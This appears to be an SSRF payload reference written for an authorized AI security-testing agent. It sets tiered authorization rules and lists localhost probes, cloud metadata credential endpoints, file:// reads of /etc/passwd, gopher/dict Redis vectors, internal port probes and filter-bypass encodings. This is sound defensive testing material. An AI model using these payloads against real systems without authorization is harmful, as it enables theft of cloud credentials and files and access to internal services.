# SSRF Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify SSRF vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual internal network attacks prohibited
> - SSRF payloads are for understanding attack surface only, **no internal network service exploitation**
> - Validation proves vulnerability existence (probe localhost or external marker), **no malicious data write**
> - Cloud metadata and internal probing require explicit user authorization
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Localhost probe, external marker, protocol detection | No authorization needed |
| **Tier 2: Authorized Extended** | Cloud metadata access, internal service probing | User explicit authorization required |
| **Tier 3: Theory Reference** | SSRF exploitation for RCE, Redis write | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming SSRF exists (localhost or marker response received).

---

## Validation Objectives (Within Security Boundary)

SSRF vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| SSRF Existence | ✓ Request localhost (`http://127.0.0.1`) | - | Internal network attack exploitation |
| External Marker | ✓ Request Collaborator/DNSLog | - | - |
| Protocol Detection | ✓ Test `file://` support | - | Redis write/Webshell |
| Cloud Metadata | ❌ Not by default | ✓ Requires explicit authorization | Credential exploitation |
| Internal Service Probe | ❌ Not by default | ✓ Requires explicit authorization | Service exploitation/RCE |

---

## Basic Probing - Safe Validation Payload

### Local Service Probing
```bash
# Within security boundary - prove SSRF existence
http://127.0.0.1
http://localhost
http://0.0.0.0

# Observe response: Can local service be accessed?
```

### ⚠️ Cloud Metadata Read (Requires Additional Authorization)

**Authorization Requirements**:
1. User explicitly authorizes cloud metadata reading
2. Only for proving SSRF capability, no credential exploitation after retrieval
3. Mark "Cloud metadata read with user authorization" in report

```bash
# AWS (requires authorization)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (requires authorization + Header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/

# Azure (requires authorization + Header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Security boundary: Read metadata only to prove SSRF; obtained credentials not used
```

---

## Protocol Support Detection (Detect Only, No Exploitation)

### file:// Protocol Test
```bash
# Within security boundary - read test file
file:///etc/passwd
file:///etc/hosts

# Windows
file:///C:/windows/win.ini
```

### ⚠️ dict://gopher:// Protocol (Exploitation Prohibited)
```bash
# These protocols can be used to attack internal services - actual exploitation prohibited
# Only for identifying vulnerability support

# Prohibited examples (technical principle only):
# dict://127.0.0.1:6379/INFO      -> ❌ Redis exploitation prohibited
# gopher://127.0.0.1:6379/...     -> ❌ Write prohibited
```

### ⚠️ Internal Port Probing (Requires Additional Authorization)

**Authorization Requirements**:
1. User explicitly authorizes internal network probing
2. Only identify open ports/services, no exploitation
3. Mark "Internal network probing executed with user authorization" in report

```bash
# Only probe, no exploitation (requires authorization)
http://127.0.0.1:22    # SSH
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:8080  # Internal Web

# Observe response: Is port open?
```

---

## Bypass Localhost Filtering (Technical Principle)

### IP Representation Bypass
| Type | Payload | Target |
|------|---------|------|
| Decimal | `http://2130706433/` | 127.0.0.1 |
| Octal | `http://0177.0.0.1/` | 127.0.0.1 |
| Hexadecimal | `http://0x7f000001/` | 127.0.0.1 |
| IPv6 | `http://[::]:80/` | localhost |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | 127.0.0.1 |

### CIDR/Short Address Bypass
```bash
http://127.127.127.127/
http://127.0.1/
http://0/
```

### Domain Redirect
```bash
http://localh.st/           # Resolves to 127.0.0.1
http://127.0.0.1.nip.io/
```

### URL Parsing Difference
```bash
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

---

## Cloud Metadata Endpoint List

### AWS
| Endpoint | Data |
|------|------|
| `/latest/meta-data/` | Instance metadata |
| `/latest/meta-data/iam/security-credentials/` | IAM credentials |
| `/latest/user-data/` | User data script |

### GCP
| Endpoint | Data |
|------|------|
| `/computeMetadata/v1/instance/` | Instance info |
| `/computeMetadata/v1/project/` | Project info |
| `/computeMetadata/v1/instance/service-accounts/` | Service accounts |

### Azure
| Endpoint | Data |
|------|------|
| `/metadata/instance` | Instance info |
| `/metadata/identity/oauth2/token` | Managed identity token |

---

## ⚠️ Internal Service Exploitation (Execution Prohibited)

Following attack paths are for **risk identification**, not actual execution:

| Service | Risk | Security Boundary |
|------|------|----------|
| Redis (6379) | Write crontab/webshell | ❌ Exploitation prohibited |
| MySQL (3306) | Read data/write | ❌ Exploitation prohibited |
| Elasticsearch (9200) | Data leakage | ❌ Exploitation prohibited |
| Docker API (2375) | Container control | ❌ Exploitation prohibited |
| Kubernetes (10250) | Pod control | ❌ Exploitation prohibited |

**After identifying these risks, mark risk level in report, no exploitation execution.**

---

## Analysis Process

1. Identify parameters (`url`, `path`, `src`, `dest`, `redirect`, `uri`)
2. Default validation: Request localhost (`http://127.0.0.1`) or external marker server
3. Protocol support detection: Test `file://` availability
4. **Stop default validation here**
5. If cloud metadata or internal probing needed, obtain user authorization first
6. Apply bypass techniques only when default validation fails
7. Mark risk level in report; no internal network attack execution

---

## Output Format

```markdown
## Vulnerability: SSRF

### Location
{URL} - {parameter name}

### Proof Payload (Default Validation)
http://127.0.0.1
http://YOUR_COLLABORATOR/ssrf-test

### Validation Result
- Local service access: ✅ Success
- External marker hit: ✅ Confirmed

### Additional Validation (If Authorized)
- Cloud metadata: {Only if authorized; mark "with user authorization"}
- Internal services: {Only if authorized; mark probing results}

### Risk Level
{see severity rules}

### Severity Classification

SSRF harm depends on **what the SSRF can reach** — requesting external network is only capability confirmed; actual high risk is reaching internal network services / cloud metadata credentials / internal admin interface. **Default only does Tier 1 safe verification (external marker / localhost probe), severity based on impact reached.**

| Actual case | Severity | Note |
|---------|------|------|
| Proof only SSRF exists (external marker callback/localhost probe has response)| **Low** | Capability confirmed, but external/localhost itself has no sensitive data |
| After user authorization reaches internal network services (port/response confirms internal reachability)| **High** | Internal network reachable = exposes internal attack surface, high value |
| After user authorization reads cloud metadata credentials (e.g. AWS IMDS /169.254.169.254)| **High** | Obtaining cloud credentials could enable lateral takeover |
| SSRF exists but restricted (specific protocols only/whitelist/cannot reach internal)| Low | Capability limited, limited impact |
| Suspected only (response anomaly but no stable callback)| Low | Pending confirmation |

**Boundary coordination**: Internal network probing / cloud metadata reading is Tier 2 (requires explicit user authorization). Therefore within default testing scope SSRF records Low. "Reaches internal network/cloud credentials = High" requires confirmation in Tier 2 scope after user authorization. Note: after reading cloud credentials **must not use those credentials** for lateral movement — only prove readability, record and stop.
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Redis write | No gopher write to crontab/webshell |
| ❌ MySQL exploitation | No database data reading |
| ❌ Credential exploitation | Cloud credentials not used after retrieval |
| ❌ Docker/K8s exploitation | No container/Pod control |
| ❌ Internal network attack | Any internal service exploitation prohibited |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Command execution prohibited"
- `README.md` -> Prohibited execution checklist